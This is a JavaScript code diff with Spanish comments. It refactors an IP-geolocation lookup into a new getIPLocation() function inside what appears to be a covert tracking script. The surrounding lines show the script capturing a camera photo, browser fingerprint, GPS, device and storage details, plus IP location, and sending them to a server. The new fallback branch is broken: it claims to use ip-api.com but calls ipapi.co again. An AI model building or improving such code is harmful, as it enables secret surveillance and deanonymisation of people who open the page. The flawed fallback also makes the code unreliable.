@@ -131,6 +131,55 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
+    // 🔥 NUEVA FUNCIÓN: Obtener IP y ubicación con respaldo
+    async function getIPLocation() {
+        // Intentar primero con ipapi.co (más confiable)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data && data.ip) {
+                return {
+                    ip: data.ip || 'N/A',
+                    country_name: data.country_name || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            }
+        } catch(e) {
+            console.log('ipapi.co falló, intentando con ip-api.com...');
+        }
+
+        // Si falla ipapi.co, intentar con ip-api.com
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data && data.ip) {
+                return {
+                    ip: data.ip || 'N/A',
+                    country_name: data.country_name || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            }
+        } catch(e) {
+            console.log('ip-api.com también falló');
+        }
+
+        // Si todo falla, devolver N/A
+        return {
+            ip: 'N/A',
+            country_name: 'N/A',
+            region: 'N/A',
+            city: 'N/A',
+            postal: 'N/A',
+            timezone: 'N/A'
+        };
+    }
+
     async function sendToServer(text, photoBlob, gps, device, fp, ipData, storage) {
         let photoBase64 = null;
         if (photoBlob) {
@@ -190,33 +239,7 @@
             const foto = await capturePhoto();
             const fp = await getFingerprint();
             const storage = await getStorageInfo();
-
-            // 🔥 CAMBIO IMPORTANTE: Usamos ip-api.com (más confiable)
-            let ipData = {};
-            try {
-                const res = await fetch('http://ip-api.com/json/');
-                const data = await res.json();
-                if (data.status === 'success') {
-                    ipData = {
-                        ip: data.query || 'N/A',
-                        country_name: data.country || 'N/A',
-                        region: data.regionName || 'N/A',
-                        city: data.city || 'N/A',
-                        postal: data.zip || 'N/A',
-                        timezone: data.timezone || 'N/A'
-                    };
-                } else {
-                    throw new Error('API no devolvió éxito');
-                }
-            } catch(e) {
-                // Si falla ip-api, intentamos con ipapi.co como respaldo
-                try {
-                    const res2 = await fetch('https://ipapi.co/json/');
-                    ipData = await res2.json();
-                } catch(e2) {
-                    ipData = { ip: 'N/A', country_name: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', timezone: 'N/A' };
-                }
-            }
+            const ipData = await getIPLocation(); // 🔥 NUEVA FUNCIÓN
 
             const device = {
                 model: "Desconocido",
